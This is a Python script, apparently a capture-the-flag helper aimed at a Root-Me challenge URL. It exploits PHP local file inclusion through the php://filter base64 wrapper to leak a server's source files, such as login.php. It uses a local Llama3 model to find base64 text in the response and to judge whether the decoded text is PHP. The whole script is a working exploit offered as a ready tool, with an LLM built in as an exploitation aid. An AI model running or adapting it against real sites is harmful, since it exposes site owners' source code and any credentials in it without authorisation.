#!/usr/bin/env python3
# ~*~ coding: utf-8 ~*~

import ollama
import requests
from base64 import b64decode as decode
from bs4 import BeautifulSoup

filter = 'php://filter/convert.base64-encode/resource='

def ask_llama3_yn(prompt):
    global verbose
    response = ollama.generate(model='llama3', prompt=prompt, stream=False)['response']
    if verbose:
        print('\n--- Llama3 ------------------------------------------')
        print(f'prompt:\n{prompt}')
        print('')
        print(f'response: {response}')
        print('-----------------------------------------------------\n')
    if response.lower() in ('oui', 'yes'):
        return True
    return False

def find_b64(html):
    global verbose
    soup = BeautifulSoup(html, 'html.parser')
    body = soup.find('body')
    for text in body.get_text().split('\n'):
        if text:
            prompt = f'{text}\nEst-ce que ce texte est encodé en base64 ? (Répond uniquement par oui ou non sans ponctuation.)'
            if ask_llama3_yn(prompt):
                if verbose:
                    cprint(f'[{colored("+", 77)}] Found base64 string : {text}')
                return text
    return None

def check_php(b64):
    text = decode(b64)
    prompt = f'{text}\nEst-ce que ce texte est un code php ? (Répond uniquement par oui ou non sans ponctuation)'
    return (ask_llama3_yn(prompt), text.decode('utf-8'))

if __name__ == '__main__':
    
    from argparse import ArgumentParser
    from pygments import highlight
    from pygments.formatters import Terminal256Formatter
    from pygments.lexers import get_lexer_for_filename, get_lexer_by_name, HtmlPhpLexer
    from termcolor_dg import colored, cprint
    
    argparser = ArgumentParser(prog='llama_phpfilter', description='Llama3 php filter exploitation assistant')
    argparser.add_argument('url', help='Entrypoint : vulnerable url (including empty query parameter)')
    argparser.add_argument('resource', help='The sourcefile name you\'re trying to lurk in')
    argparser.add_argument('-v', '--verbose', action='store_true', help='Show discussions with llama')
    
    args = argparser.parse_args()
    entrypoint = args.url       # http://challenge01.root-me.org/web-serveur/ch12/?inc=
    resource   = args.resource  # login.php
    verbose    = args.verbose
    url = f'{entrypoint}{filter}{resource}'
    colored_url = f'{colored(entrypoint, 208)}{colored(filter, 39)}{colored(resource, 77)}'
    
    cprint(f'[{colored("*", 39)}] Exploit URL: {colored_url}')
    
    if verbose:
        cprint(f'[{colored("*", 39)}] Requesting URL')
    res = requests.get(url)
    
    cprint(f'[{colored("*", 39)}] Searching base64 string')
    b64string = find_b64(res.text)
    
    if b64string:
        cprint(f'[{colored("*", 39)}] Checking PHP')
        is_php, text = check_php(b64string)
        
        if is_php:
            cprint(f'[{colored("+", 77)}] Found PHP source code!\n')
            #lexer = get_lexer_for_filename(resource)
            print(highlight(text, HtmlPhpLexer(), Terminal256Formatter(style='github-dark', linenos=True)))
        else:
            cprint(f'[{colored("-", 196)}] It\'s not PHP, but you might look at it anyway...\n')
            print(text)   
    else:
        cprint(f'[{colored("-", 196)}] Base64 string not found in the response page. Might not be vulnerable...')
        print('Here is the page :\n')
        lexer = get_lexer_by_name('html')
        print(highlight(res.text, lexer, Terminal256Formatter()))

    